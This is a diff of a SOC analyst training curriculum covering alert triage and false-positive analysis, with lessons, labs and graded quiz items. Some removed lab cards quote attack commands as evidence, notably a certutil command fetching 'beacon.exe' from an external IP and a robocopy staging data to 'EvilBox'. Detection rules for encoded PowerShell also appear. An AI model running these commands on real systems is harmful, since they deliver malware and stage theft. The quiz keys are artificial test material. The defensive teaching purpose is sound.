-            explanation: 'The four entities (User, Host, IP, Evidence) form the foundation of every professional investigation report.',
-          },
-        },
-      },
+            "correctVerdict": "TRUE_POSITIVE",
+            "rationale": "Rapid consecutive logon failures followed by immediate logon success from an external anonymizing Tor exit node confirms unauthorized credential compromise.",
+            "analystAction": "Revoke active session tokens for Finance01, isolate workstation FIN-PC-04 via EDR, and escalate case to Tier 2 Incident Response."
+          }
+        }
+      }
     ],
-    assessment: {
-      id: 'unit-3-assessment',
-      title: 'Unit 3 Assessment: Alert Triage',
-      passingScore: 80,
-      xpReward: 150,
-      questions: [
+    "assessment": {
+      "id": "unit-3-assessment",
+      "title": "Unit 3 Assessment: Alert Triage Methodology",
+      "passingScore": 75,
+      "xpReward": 100,
+      "questions": [
         {
-          id: 'u3-q1',
-          question: 'What are the four essential entities an analyst must extract during alert triage?',
-          options: [
-            'Monitor serial number, keyboard layout, mouse speed, desk location',
-            'User account, Hostname/Asset, Source/Destination IP, and Raw Evidence/Command',
-            'Company revenue, stock price, CEO name, coffee brand',
-            'Operating system wallpaper, sound volume, screen brightness, battery percentage',
+          "id": "u3-q1",
+          "question": "What is the very first step an analyst should perform when opening a newly assigned alert?",
+          "options": [
+            "Immediately isolate the domain controller",
+            "Read and understand the alert rule logic, trigger signature, and intended threat category",
+            "Delete the alert from the queue to keep SLA low",
+            "Call the user on the phone"
           ],
-          correctAnswer: 1,
-          explanation: 'User, Host, IP, and Evidence are the four pillars needed to identify, contain, and scope an intrusion.',
+          "correctAnswer": 1,
+          "explanation": "Before investigating entities, you must understand what specific detection rule fired and why it was created."
         },
         {
-          id: 'u3-q2',
-          question: 'Why do attackers frequently execute commands with `-enc` (Base64 encoding) in PowerShell?',
-          options: [
-            'It makes the command run 10 times faster',
-            'It obscures the malicious script from casual human reading and simple signature scanners',
-            'It prevents the computer from using battery power',
-            'It is required by Microsoft for all Windows scripts',
+          "id": "u3-q2",
+          "question": "In process lineage analysis, which of the following parent-child relationships is most indicative of malicious activity?",
+          "options": [
+            "explorer.exe spawning chrome.exe",
+            "services.exe spawning svchost.exe",
+            "WINWORD.EXE spawning powershell.exe with -enc arguments",
+            "system spawning smss.exe"
           ],
-          correctAnswer: 1,
-          explanation: 'Base64 obfuscation masks command strings (like `Invoke-WebRequest` or `DownloadString`) from simple string-matching rules.',
+          "correctAnswer": 2,
+          "explanation": "Microsoft Office applications (Word, Excel) spawning command interpreters (cmd.exe, powershell.exe) is a classic macro attack pattern."
         },
         {
-          id: 'u3-q3',
-          question: 'If `excel.exe` spawns `cmd.exe` or `powershell.exe`, what is the most likely explanation?',
-          options: [
-            'Microsoft Excel is performing a routine spreadsheet auto-save',
-            'A malicious macro or exploit embedded in the document is executing a living-off-the-land stager',
-            'The computer monitor needs to be calibrated',
-            'The user opened a formula with more than 10 rows',
+          "id": "u3-q3",
+          "question": "When checking external IP reputation during entity extraction, what does a high Abuse Confidence Score (90%+) on AbuseIPDB signify?",
+          "options": [
+            "The IP belongs to a trusted government agency",
+            "Multiple independent organizations have recently reported malicious activity (brute force, C2, scanning) originating from that IP",
+            "The IP address is definitely offline",
+            "The alert should be closed as false positive"
           ],
-          correctAnswer: 1,
-          explanation: 'Productivity applications like Word and Excel should never spawn interactive command shells in normal business workflows.',
+          "correctAnswer": 1,
+          "explanation": "High abuse scores reflect verified recent malicious activity reported across global networks."
         },
         {
-          id: 'u3-q4',
-          question: 'Why must both the hostname and internal IP address be documented during triage?',
-          options: [
-            'Because DHCP addresses change dynamically, but hostnames remain constant across lease renewals',
-            'Because hostnames cannot be written in English',
-            'Because IP addresses are only used for gaming',
-            'Because the SIEM crashes if one is left empty',
+          "id": "u3-q4",
+          "question": "Why should an analyst NOT reboot an endpoint immediately upon confirming a true positive malware infection?",
+          "options": [
+            "Rebooting deletes all logs permanently from the SIEM",
+            "Volatile evidence stored in RAM (decrypted malware keys, active C2 sockets, injected code) will be permanently lost",
+            "Rebooting upgrades Windows automatically",
+            "Analysts are not allowed to reboot computers"
           ],
-          correctAnswer: 0,
-          explanation: 'IP leases shift frequently in dynamic corporate DHCP environments; pairing hostname and IP ensures forensic accuracy.',
-        },
-        {
-          id: 'u3-q5',
-          question: 'What is the appropriate action when an analyst confirms that an alert represents a true active compromise?',
-          options: [
-            'Close the alert as resolved to keep the queue clean',
-            'Classify as True Positive, preserve evidence, initiate host containment, and escalate per playbook',
-            'Reboot the computer and hope the malware disappears',
-            'Send an email to all company staff warning them not to turn on their laptops',
-          ],
-          correctAnswer: 1,
-          explanation: 'A confirmed True Positive requires immediate escalation, evidence preservation, and containment actions according to the playbook.',
-        },
-      ],
-    },
+          "correctAnswer": 1,
+          "explanation": "Rebooting destroys RAM and volatile memory. The analyst should isolate the host via EDR network containment while keeping power on for forensic memory capture."
+        }
+      ]
+    }
   },
-
-  // =========================================================================
-  // UNIT 4: FALSE POSITIVES
-  // =========================================================================
   {
-    id: 'unit-4',
-    unitNumber: 4,
-    title: 'Unit 4: False Positives',
-    description: 'Learn to distinguish between malicious True Positives, Expected Activity, Benign True Positives, and Detection Errors, and conduct rule tuning.',
-    estimatedHours: 2,
-    topics: [
+    "id": "unit-4",
+    "unitNumber": 4,
+    "title": "Unit 4: False Positives",
+    "description": "Learn to accurately differentiate malicious intrusions from expected administrative activity, benign software behavior, and SIEM detection errors.",
+    "estimatedHours": 0.42,
+    "topics": [
       {
-        id: 'topic-4-1',
-        unitId: 'unit-4',
-        title: 'Expected Activity & Benign True Positives',
-        order: 1,
-        estimatedMinutes: 20,
-        xpReward: 50,
-        theory: {
-          summaryLines: [
-            'A False Positive (FP) occurs when a security tool triggers an alert on harmless, legitimate activity.',
-            'Category 1: Expected Activity. Routine IT operations (e.g. weekly vulnerability scans by Nessus, scheduled backups by Robocopy, SCCM software deployments) that match attack signatures.',
-            'Category 2: Benign True Positive (BTP). The alert fired correctly because the rule condition was met (e.g., an admin opened a PowerShell remote session), but investigation proves the intent was authorized and harmless.',
-            'Distinguishing between true threats and benign noise requires investigating: Who ran it? When? Under what change ticket? Did it behave maliciously?',
-            'Closing a False Positive requires documenting the exact evidence why the activity was safe.',
+        "id": "topic-4-1",
+        "unitId": "unit-4",
+        "title": "Chapter 1: Expected Activity & Benign Behavior",
+        "order": 1,
+        "estimatedMinutes": 12,
+        "xpReward": 50,
+        "theory": {
+          "summaryLines": [
+            "A False Positive (FP) occurs when a security rule triggers on activity that is completely legitimate, authorized, or benign.",
+            "Expected Activity includes scheduled IT tasks: vulnerability scanners (Nessus/Qualys), backup software (Veeam), software deployment (SCCM/Intune), and approved penetration tests.",
+            "Benign Activity includes legitimate administrative tools (Living off the Land) such as IT admins using PsExec, PowerShell, or certutil to update certificates.",
+            "A True Positive (TP) is confirmed malicious or unauthorized activity matching attacker tactics.",
+            "A Benign True Positive (BTP) is authorized activity that technically matches rule logic (e.g. an approved IT script using whoami.exe for hardware inventory)."
           ],
-          knowMore: {
-            title: 'NIST Guide to Intrusion Detection Tuning',
-            description: 'Best practices for reducing false-alarm rates while maintaining high detection sensitivity.',
-            externalUrl: 'https://csrc.nist.gov/',
-            externalLabel: 'Read NIST Detection Guidelines',
-          },
+          "knowMore": {
+            "title": "NIST: Minimizing False Positive Rates in Intrusion Detection",
+            "description": "Learn scientific approaches for measuring False Positive Rates (FPR), tuning detection filters, and maintaining high precision in SOC alerting.",
+            "externalUrl": "https://csrc.nist.gov/glossary/term/false_positive",
+            "externalLabel": "NIST False Positive Guide"
+          }
         },
-        demo: {
-          title: 'Expected Activity vs Malicious Intrusion',
-          subtitle: 'Comparing two identical PowerShell executions to uncover the difference between routine IT work and adversary intrusion.',
-          steps: [
-            {
-              stepNumber: 1,
-              title: 'Scenario A: IT Admin Backup Script',
-              description: 'Execution: `robocopy.exe C:\\Data \\\\BackupServer\\Share` at 02:00 AM by service account `svc-backup` linked to approved change request CR-9912.',
-              visualType: 'terminal',
-              highlightElements: ['svc-backup', 'approved-change'],
-              narration: 'Authorized, expected system maintenance activity. Classified as Benign Expected Activity.',
-            },
-            {
-              stepNumber: 2,
-              title: 'Scenario B: Adversary Data Staging',
-              description: 'Execution: `robocopy.exe C:\\Users \\\\EvilBox\\Share` at 02:15 AM by compromised account `jdoe-intern` to an external host.',
-              visualType: 'terminal',
-              highlightElements: ['compromised-user', 'evil-destination'],
-              narration: 'Unauthorized exfiltration staging using identical binary. Classified as True Positive Malicious Incident.',
-            },
-          ],
+        "demo": {
+                  "title": "[Demo] Same Alert, Different Story",
+                  "subtitle": "See how identical alerts take on completely different meanings when evaluated with organizational context",
+                  "steps": [
+                            {
+                                      "id": 1,
+                                      "stage": "1. Identical Triggers",
+                                      "iconName": "siem",
+                                      "title": "Two Alerts with Identical Names",
+                                      "description": "Both scenarios trigger the exact same SIEM alert: 'Multiple Failed Login Attempts' (Threshold > 3 failures).",
+                                      "telemetrySnippet": "ALERT A: Multiple Failed Logins | ALERT B: Multiple Failed Logins | Identical Rule Trigger",
+                                      "highlightText": "Alert names alone do not convey risk; context determines the true meaning."
+                            },
+                            {
+                                      "id": 2,
+                                      "stage": "2. Scenario A Context",
+                                      "iconName": "endpoint",
+                                      "title": "Scenario A: User Forgot Password",
+                                      "description": "Source is FIN-PC-04 at 09:05 AM on Monday. User called helpdesk regarding an expired password.",
+                                      "telemetrySnippet": "SCENARIO A: Known User (Finance01) | Known Host (FIN-PC-04) | Business Hours | Internal LAN",
+                                      "highlightText": "Scenario A has low risk: expected user, known device, normal business hours."
+                            },
+                            {
+                                      "id": 3,
+                                      "stage": "3. Scenario B Context",
+                                      "iconName": "attacker",
+                                      "title": "Scenario B: External Credential Attack",
+                                      "description": "Source is an unallocated external IP (198.51.100.42) at 03:15 AM attempting 25 different employee accounts.",
+                                      "telemetrySnippet": "SCENARIO B: Unknown Source IP | Multiple Target Users | 03:15 AM Weekend | Non-Standard Subnet",
+                                      "highlightText": "Scenario B represents an active credential spray attack targeting the perimeter."
+                            },
+                            {
+                                      "id": 4,
+                                      "stage": "4. Comparative Evaluation",
+                                      "iconName": "server",
+                                      "title": "Side-by-Side Context Comparison",
+                                      "description": "Scenario A: Internal LAN, single user, followed by success. Scenario B: External WAN, multi-user spray, no success.",
+                                      "telemetrySnippet": "EVALUATION: Scenario A = Benign User Error | Scenario B = Active Adversary Spray",
+                                      "highlightText": "Evaluating who, where, and when instantly differentiates harmless noise from real attacks."
+                            },
+                            {
+                                      "id": 5,
+                                      "stage": "5. Assessment Conclusion",
+                                      "iconName": "analyst",
+                                      "title": "Different Assessment for Identical Alerts",
+                                      "description": "Same Alert + Different Context = Different Assessment. Scenario A is closed; Scenario B triggers immediate IP block.",
+                                      "telemetrySnippet": "DISPOSITION: Alert A -> Close (False Positive) | Alert B -> Escalate & Contain (True Positive)",
+                                      "highlightText": "Contextual reasoning is the core skill that defines an effective SOC analyst."
+                            }
+                  ]
         },
-        interactive: {
-          title: 'Benign vs. Malicious Activity Comparator',
-          scenario: 'Analyze 3 operational scenarios and determine which represents Expected Benign Activity vs. True Malicious Intrusion.',
-          cards: [
-            {
-              id: 'card-fp1',
-              title: 'Vulnerability Scanner Activity',
-              source: 'Internal Network IDS',
-              timestamp: '03:00:15 UTC',
-              category: 'network',
-              summary: 'Mass SYN sweep on port 445 originated from IP `10.0.100.50` (Approved Tenable Nessus Scanner).',
-              details: [
-                { label: 'Authorized Scanner', value: 'Yes - Registered in Asset Inventory' },
-                { label: 'Change Window', value: 'Window CHG-440 (Weekly Security Scan)' },
-                { label: 'Verdict', value: 'Expected Activity (False Positive)' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 15,
-              tags: ['Expected', 'Scanner', 'FP'],
-            },
-            {
-              id: 'card-fp2',
-              title: 'Developer Node.js Localhost Binding',
-              source: 'Engineering Workstation',
-              timestamp: '15:10:00 UTC',
-              category: 'host',
-              summary: 'Alert: "Suspicious Listening Port Opened". Software engineer running `npm run dev` binding to `127.0.0.1:3000`.',
-              details: [
-                { label: 'User Role', value: 'Frontend Developer' },
-                { label: 'Binding Scope', value: 'Localhost Loopback Only' },
-                { label: 'Verdict', value: 'Benign True Positive (Safe Dev Activity)' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 20,
-              tags: ['Benign', 'Developer', 'Loopback'],
-            },
-            {
-              id: 'card-fp3',
-              title: 'External Remote Access Tool Installed',
-              source: 'Receptionist Workstation',
-              timestamp: '16:45:22 UTC',
-              category: 'host',
-              summary: 'Alert: "AnyDesk / TeamViewer Installed". User received a cold phone call from "Helpdesk" claiming a virus infection.',
-              details: [
-                { label: 'Corporate Policy', value: 'Unauthorized Remote Tools Prohibited' },
-                { label: 'Threat Actor', value: 'Social Engineering / Tech Support Scam' },
-                { label: 'Verdict', value: 'True Positive Malicious Intrusion' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 95,
-              tags: ['True-Positive', 'Scam', 'Remote-Access'],
-            },
-          ],
+        "interactive": {
+                  "title": "[Interactive] Context Changes the Story",
+                  "scenario": "Sort each context factor into whether it indicates Expected/Benign activity or Suspicious/Malicious activity.",
+                  "cards": [
+                            {
+                                      "id": "ctx-1",
+                                      "category": "User",
+                                      "label": "Logon from assigned desk PC during business hours",
+                                      "summary": "Finance01 logging into FIN-PC-04 at 09:00 AM on a Tuesday.",
+                                      "detailedFindings": "Classification: EXPECTED / BENIGN. Standard user routine matching established behavioral baseline.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "ctx-2",
+                                      "category": "Source IP",
+                                      "label": "Scheduled vulnerability scan from IT subnet",
+                                      "summary": "Vulnerability scanner IP running authenticated checks during approved maintenance window.",
+                                      "detailedFindings": "Classification: EXPECTED / BENIGN. Authorized security testing documented in IT change calendar.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "ctx-3",
+                                      "category": "Event ID",
+                                      "label": "External IP attempting 30 employee accounts",
+                                      "summary": "Single public IP sending repeated authentication requests across diverse usernames.",
+                                      "detailedFindings": "Classification: SUSPICIOUS. Classic horizontal password spray attempting to compromise accounts.",
+                                      "severityIndicator": "Malicious"
+                            },
+                            {
+                                      "id": "ctx-4",
+                                      "category": "Timeline",
+                                      "label": "High-volume login attempts at 03:00 AM on Sunday",
+                                      "summary": "Authentication requests surging during non-business hours from unfamiliar network origin.",
+                                      "detailedFindings": "Classification: SUSPICIOUS. Temporal anomaly indicating potential automated adversary probing.",
+                                      "severityIndicator": "Suspicious"
+                            }
+                  ]
         },
-        socContext: {
-          title: 'The "Close and Forget" Trap',
-          scenario: 'An analyst closed an alert as a False Positive because the username was "Administrator", without checking if the administrator was actually working at that hour.',
-          analystMindset: 'Attackers love compromising administrative accounts because analysts often dismiss administrative activity as routine. Always verify authorized intent.',
-          bestPractices: [
-            'Cross-check high-privilege executions against active Change Management tickets before closing.',
-            'When in doubt, contact the user via an out-of-band channel (e.g. phone or Slack) to confirm they initiated the action.',
-            'Never close an alert as a False Positive without documenting the verification evidence in the ticket.',
-          ],
+        "socContext": {
+          "title": "The Danger of Careless False Positive Closures",
+          "scenario": "An attacker noticed that the SOC always ignores alerts on \"svc_scanner\", so they named their malware \"svc_scanner.exe\" to avoid detection.",
+          "analystMindset": "Never judge an alert solely by the process name or username. Verify the full path, parent process, hash, and destination network.",
+          "bestPractices": [
+            "Always link an authorized Change Request (CHG#) or Jira ticket when closing as expected activity.",
+            "Verify that the process hash matches the authentic vendor binary, not an imposter.",
+            "Confirm that source and destination IP addresses match documented infrastructure zones."
+          ]
         },
-        knowledgeCheck: {
-          matching: {
-            title: 'Match Triage Outcome to Operational Definition',
-            instructions: 'Pair each classification with its real-world SOC meaning.',
-            pairs: [
-              { id: 'fp-1', left: 'True Positive (TP)', right: 'Alert triggered on genuine malicious activity; requires containment' },
-              { id: 'fp-2', left: 'False Positive (FP)', right: 'Alert triggered on benign activity; rule needs refinement or allowlist' },
-              { id: 'fp-3', left: 'Benign True Positive (BTP)', right: 'Rule fired correctly, but activity was verified as authorized business action' },
-              { id: 'fp-4', left: 'False Negative (FN)', right: 'Malicious attack bypassed detection; no alert fired (the most dangerous outcome)' },
+        "knowledgeCheck": {
+          "matching": {
+            "title": "Classify True vs False Positive Scenarios",
+            "instructions": "Match each scenario to its correct classification.",
+            "pairs": [
+              {
+                "id": "fp1",
+                "left": "Vulnerability scanner runs scheduled port sweep matching approved change ticket",
+                "right": "False Positive: Expected System Activity (Authorized scanner run)"
+              },
+              {
+                "id": "fp2",
+                "left": "Word doc spawns powershell downloading executable from unknown IP",
+                "right": "True Positive: Malicious Execution (Initial macro dropper)"
+              },
+              {
+                "id": "fp3",
+                "left": "HR user attempts 3 incorrect passwords after returning from vacation",
+                "right": "False Positive: Benign User Error (Routine credential mistake)"
+              },
+              {
+                "id": "fp4",
+                "left": "Ransomware deletes volume shadow copies via vssadmin",
+                "right": "True Positive: Destructive Attack (Inhibiting system recovery)"
+              }
             ],
-            explanation: 'Mastering these 4 definitions ensures accurate metrics and effective detection rule tuning.',
-          },
-        },
+            "explanation": "Authorized tasks and benign mistakes are False Positives; unauthorized macro execution and ransomware destruction are True Positives."
+          }
+        }
       },
       {
-        id: 'topic-4-2',
-        unitId: 'unit-4',
-        title: 'Detection Errors & FP Identification Lab',
-        order: 2,
-        estimatedMinutes: 25,
-        xpReward: 60,
-        theory: {
-          summaryLines: [
-            'Detection Errors occur when a rule is poorly written or overly broad.',
-            'Examples of Detection Errors: A rule alerting on any process named `calc.exe`, or matching greedy regex patterns that catch legitimate paths.',
-            'Rule Tuning: The engineering process of refining alert logic to exclude verified benign patterns without creating blind spots.',
-            'Tuning Methods: Adding specific exclusions (e.g., exclude service account `svc-backup` only when running `robocopy.exe` from `C:\\Scripts\\Backup.ps1`).',
-            'Rule Retirement: If a rule cannot be tuned and produces over 95% noise, it must be disabled or rewritten.',
+        "id": "topic-4-2",
+        "unitId": "unit-4",
+        "title": "Chapter 2: Detection Errors & [Lab] 🔵 False-Positive Identification",
+        "order": 2,
+        "estimatedMinutes": 13,
+        "xpReward": 75,
+        "theory": {
+          "summaryLines": [
+            "Detection Errors occur when a correlation rule is poorly constructed, contains flawed regular expressions, or uses overly broad logic.",
+            "Example of a Flawed Rule: Triggering on any command containing the word \"admin\" will generate hundreds of false alerts from administrative URLs and filenames.",
+            "Example of a Flawed Threshold: Firing an alert on >3 failed logins in an hour triggers on every human employee who typos their credentials.",
+            "The SIEM Tuning Loop: Tier 1 analysts must report flawed rules to Tier 3 detection engineers with concrete recommendations for rule refinement.",
+            "Good rule refinement adds precise exclusions (e.g. filter by known Parent PID, specific signer certificates, or dedicated management subnets)."
           ],
-          knowMore: {
-            title: 'Sigma HQ: Generic Signature Format for SIEM Systems',
-            description: 'Learn how to write precise, robust detection rules that minimize false positives.',
-            externalUrl: 'https://github.com/SigmaHQ/sigma',
-            externalLabel: 'Browse Sigma Rule Repository',
-          },
+          "knowMore": {
+            "title": "Sigma HQ: Best Practices for Writing Robust Detection Rules",
+            "description": "Read the official Sigma rule documentation on constructing precise condition logic that minimizes detection noise.",
+            "externalUrl": "https://github.com/SigmaHQ/sigma",
+            "externalLabel": "Sigma Rule Guidelines"
+          }
         },
-        demo: {
-          title: 'Tuning a Greedy Detection Rule',
-          subtitle: 'Refining an alert from 500 noisy alerts per day down to zero false alarms.',
-          steps: [
-            {
-              stepNumber: 1,
-              title: 'The Flawed Rule',
-              description: 'Rule logic: `process.name == powershell.exe`. Fired 800 times a day because Windows OS uses PowerShell for routine diagnostics.',
-              visualType: 'terminal',
-              highlightElements: ['broad-rule', 'high-noise'],
-              narration: 'A greedy rule that alerts on common administrative utilities is useless.',
-            },
-            {
-              stepNumber: 2,
-              title: 'The Tuned Rule',
-              description: 'New logic: `process.name == powershell.exe AND process.command_line contains "-enc" AND parent_process.name in ["winword.exe", "excel.exe"]`.',
-              visualType: 'terminal',
-              highlightElements: ['precise-rule', 'zero-noise'],
-              narration: 'The tuned rule catches genuine attacks while ignoring routine administration.',
-            },
-          ],
+        "demo": {
+                  "title": "[Demo] When the Detection Gets It Wrong",
+                  "subtitle": "Observe how rigid detection rules generate alert noise and how contextual tuning restores signal clarity",
+                  "steps": [
+                            {
+                                      "id": 1,
+                                      "stage": "1. Naive Detection Rule",
+                                      "iconName": "siem",
+                                      "title": "Rigid Threshold Rule Configured",
+                                      "description": "SIEM rule is created: 'If Failed Logins > 3, Trigger Alert'. Rule has no contextual exceptions or whitelists.",
+                                      "telemetrySnippet": "RULE DEFINITION: index=auth action=failure | stats count by user | where count > 3",
+                                      "highlightText": "Overly simplistic detection logic triggers on normal human mistakes as well as attacks."
+                            },
+                            {
+                                      "id": 2,
+                                      "stage": "2. Monday Morning Avalanche",
+                                      "iconName": "endpoint",
+                                      "title": "50 Employees Mistype Passwords",
+                                      "description": "Employees returning from the weekend mistype passwords; 50 alerts instantly flood the SOC queue.",
+                                      "telemetrySnippet": "QUEUE FLOOD: 50 New Alerts | Rule: Failed Logins > 3 | All internal finance/sales users",
+                                      "highlightText": "High false-positive rates drown analysts in noise and cause severe alert fatigue."
+                            },
+                            {
+                                      "id": 3,
+                                      "stage": "3. Alert Fatigue & Blindspots",
+                                      "iconName": "attacker",
+                                      "title": "Real Attacks Buried in Noise",
+                                      "description": "While analysts spend hours closing benign typo alerts, an actual password spray slips past undetected.",
+                                      "telemetrySnippet": "CONSEQUENCE: Analyst time consumed | True threat delayed in backlog",
+                                      "highlightText": "Alert noise is dangerous because it masks genuine threats waiting in the queue."
+                            },
+                            {
+                                      "id": 4,
+                                      "stage": "4. Adding Context to Detection",
+                                      "iconName": "server",
+                                      "title": "Tuning Rule with Smarter Filters",
+                                      "description": "Engineers tune the rule: require failures across multiple user accounts OR from non-whitelisted external IPs.",
+                                      "telemetrySnippet": "TUNED RULE: where user_count > 5 OR src_ip NOT IN (corporate_subnets)",
+                                      "highlightText": "Adding contextual filters eliminates benign user errors without lowering security posture."
+                            },
+                            {
+                                      "id": 5,
+                                      "stage": "5. Clean Signal Restored",
+                                      "iconName": "analyst",
+                                      "title": "False Positives Drop 90%",
+                                      "description": "Routine user typos no longer alert, while true multi-account adversary sprays remain reliably caught.",
+                                      "telemetrySnippet": "OUTCOME: Queue volume normalized | False positives: -90% | Real attacks: 100% caught",
+                                      "highlightText": "Effective detection engineering balances sensitivity to attacks with tolerance for normal operations."
+                            }
+                  ]
         },
-        interactive: {
-          title: 'Hands-On Lab: False-Positive Identification',
-          scenario: 'Review 3 live queue cases. Evaluate the evidence, identify which are False Positives vs True Positives, and recommend rule tuning.',
-          cards: [
-            {
-              id: 'card-lab-fp1',
-              title: 'Case 1: Nightly Robocopy on Database Server',
-              source: 'Host Event Logs',
-              timestamp: '02:00:00 UTC',
-              category: 'host',
-              summary: '`robocopy.exe E:\\Backups \\\\Nas01\\DBBackups` run by `svc-sql-backup`. Matches approved weekly schedule.',
-              details: [
-                { label: 'Classification', value: 'Expected Activity (False Positive)' },
-                { label: 'Tuning Fix', value: 'Allowlist `svc-sql-backup` executing `robocopy.exe` with destination `\\\\Nas01\\DBBackups`' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 10,
-              tags: ['Lab-FP', 'Tuning', 'Expected'],
-            },
-            {
-              id: 'card-lab-fp2',
-              title: 'Case 2: Inbound Firewall SYN to Closed Port 23',
-              source: 'Perimeter Firewall Log',
-              timestamp: '02:14:10 UTC',
-              category: 'network',
-              summary: 'Inbound packet dropped on port 23 (Telnet). Perimeter firewall dropped packet; zero internal hosts responded.',
-              details: [
-                { label: 'Classification', value: 'Benign Internet Noise / Detection Error' },
-                { label: 'Tuning Fix', value: 'Only alert on accepted inbound connections, not dropped edge scans' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 15,
-              tags: ['Lab-FP', 'Dropped-Scan', 'Noise'],
-            },
-            {
-              id: 'card-lab-fp3',
-              title: 'Case 3: Certutil.exe Downloading External .EXE',
-              source: 'HR Laptop Endpoint Telemetry',
-              timestamp: '02:30:15 UTC',
-              category: 'host',
-              summary: '`certutil.exe -urlcache -split -f http://45.142.122.9/beacon.exe %TEMP%\\svchost.exe`.',
-              details: [
-                { label: 'Classification', value: 'True Positive (Malicious Living-off-the-Land Attack)' },
-                { label: 'Action', value: 'Immediate host isolation and P1 incident escalation' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 100,
-              tags: ['Lab-TP', 'Living-off-the-Land', 'Malicious'],
-            },
-          ],
+        "interactive": {
+                  "title": "[Interactive] Find the False Positive",
+                  "scenario": "Analyze each realistic alert scenario and determine whether it represents a False Positive (Benign/Expected) or a True Positive (Suspicious).",
+                  "cards": [
+                            {
+                                      "id": "fp-1",
+                                      "category": "User",
+                                      "label": "Employee forgot password after vacation",
+                                      "summary": "Finance clerk enters wrong password 4 times, then calls helpdesk and logs in successfully.",
+                                      "detailedFindings": "Verdict: FALSE POSITIVE (Benign User Error). Expected human behavior; no adversary involvement.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "fp-2",
+                                      "category": "Source IP",
+                                      "label": "Scheduled vulnerability scan on servers",
+                                      "summary": "Approved scanner tests administrative credentials during scheduled Sunday maintenance window.",
+                                      "detailedFindings": "Verdict: FALSE POSITIVE (Expected Activity). Authorized security audit documented in advance.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "fp-3",
+                                      "category": "Event ID",
+                                      "label": "Unknown source attacking 40 accounts",
+                                      "summary": "Foreign public IP attempts dictionary passwords against 40 separate executive usernames in 2 minutes.",
+                                      "detailedFindings": "Verdict: TRUE POSITIVE (Malicious Credential Spray). Active adversary reconnaissance requiring immediate response.",
+                                      "severityIndicator": "Malicious"
+                            },
+                            {
+                                      "id": "fp-4",
+                                      "category": "Timeline",
+                                      "label": "SysAdmin syncs domain controller service",
+                                      "summary": "Lead administrator runs scheduled PowerShell script to synchronize service accounts across forest.",
+                                      "detailedFindings": "Verdict: FALSE POSITIVE (Authorized Admin Activity). Routine infrastructure operations.",
+                                      "severityIndicator": "Normal"
+                            }
+                  ]
         },
-        socContext: {
-          title: 'The Danger of Over-Tuning',
-          scenario: 'An engineer created an allowlist rule: "Ignore any command run by user `john.smith`". Two months later, John\'s account was compromised and ransomed the network completely unmonitored.',
-          analystMindset: 'Never allowlist an entire user or an entire directory. Always tie tuning exclusions to specific binary paths, exact hashes, and parent processes.',
-          bestPractices: [
-            'Tune rules based on specific command parameters and parent processes, never broad usernames.',
-            'Review all allowlist rules quarterly to ensure obsolete exceptions are removed.',
-            'Document the exact business justification for every detection exclusion.',
-          ],
+        "socContext": {
+          "title": "Closing the Feedback Loop with Detection Engineering",
+          "scenario": "An alert for \"Certutil Download\" triggers 40 times a week on the same software update script.",
+          "analystMindset": "Do not just close false positives—fix them. Submit tuning tickets specifying the exact parent path and hash exclusions needed.",
+          "bestPractices": [
+            "Include the alert ID and raw log payload in all SIEM tuning requests.",
+            "Never request a blanket exclusion of an entire binary (e.g. do not exclude all powershell.exe).",
+            "Always test rule modifications in staging before deploying to the production alert queue."
+          ]
         },
-        knowledgeCheck: {
-          dragDrop: {
-            title: 'Classify the Case Studies',
-            instructions: 'Sort each case into its correct triage verdict.',
-            items: [
-              { id: 'cd-1', label: 'Approved scheduled backup script run by service account', category: 'False Positive (Expected)' },
-              { id: 'cd-2', label: 'Perimeter firewall drops random port scan from internet', category: 'False Positive (Noise)' },
-              { id: 'cd-3', label: 'Office macro launches CertUtil downloading executable', category: 'True Positive (Malicious)' },
-              { id: 'cd-4', label: 'Developer tests web server locally on 127.0.0.1:8080', category: 'False Positive (Benign TP)' },
+        "knowledgeCheck": {
+          "triageScenario": {
+            "id": "ts-fp-lab",
+            "alertName": "Alert ALT-309: High-Volume Network Port Scan",
+            "severity": "MEDIUM",
+            "scenarioText": "SIEM detected 5,000 port connections from 10.0.99.10 across internal subnets. The asset database confirms 10.0.99.10 is the enterprise Tenable Nessus scanner running its scheduled Thursday audit.",
+            "evidenceItems": [
+              {
+                "label": "Source Host",
+                "value": "10.0.99.10 (Nessus Scanner)",
+                "insight": "Authorized vulnerability scanner"
+              },
+              {
+                "label": "Destination",
+                "value": "10.0.4.0/24 (Internal LAN)",
+                "insight": "Scheduled weekly audit"
+              },
+              {
+                "label": "Change Ticket",
+                "value": "CHG-9901 (Approved)",
+                "insight": "Authorized maintenance window"
+              }
             ],
-            explanation: 'Recognizing legitimate IT operations prevents wasted time and allows focus on genuine threats.',
-          },
-        },
-      },
+            "correctVerdict": "FALSE_POSITIVE",
+            "rationale": "The scan activity originates from an authorized vulnerability scanner during an approved maintenance window, constituting expected administrative activity.",
+            "analystAction": "Document change ticket CHG-9901 in the ticket, close alert as False Positive (Expected Activity), and verify exclusion tuning."
+          }
+        }
+      }
     ],
-    assessment: {
-      id: 'unit-4-assessment',
-      title: 'Unit 4 Assessment: False Positives',
-      passingScore: 80,
-      xpReward: 150,
-      questions: [
+    "assessment": {
+      "id": "unit-4-assessment",
+      "title": "Unit 4 Assessment: False Positive Analysis",
+      "passingScore": 75,
+      "xpReward": 100,
+      "questions": [
         {
-          id: 'u4-q1',
-          question: 'What defines a False Positive in a security monitoring context?',
-          options: [
-            'An attack that encrypted all servers without triggering an alert',
-            'An alert triggered on legitimate, authorized, or harmless system activity',
-            'An alert written in another programming language',
-            'A computer that has lost network connectivity',
+          "id": "u4-q1",
+          "question": "What defines a security False Positive in a SOC environment?",
+          "options": [
+            "An alert that accurately detected a real hacker",
+            "An alert triggered on activity that is legitimate, authorized, or benign",
+            "A malware attack that succeeded without detection",
+            "An alert that was sent to the wrong analyst"
           ],
-          correctAnswer: 1,
-          explanation: 'False Positives occur when legitimate business operations match overly broad detection rules.',
+          "correctAnswer": 1,
+          "explanation": "A false positive is an alert that fired on normal, approved, or non-malicious activity."
         },
         {
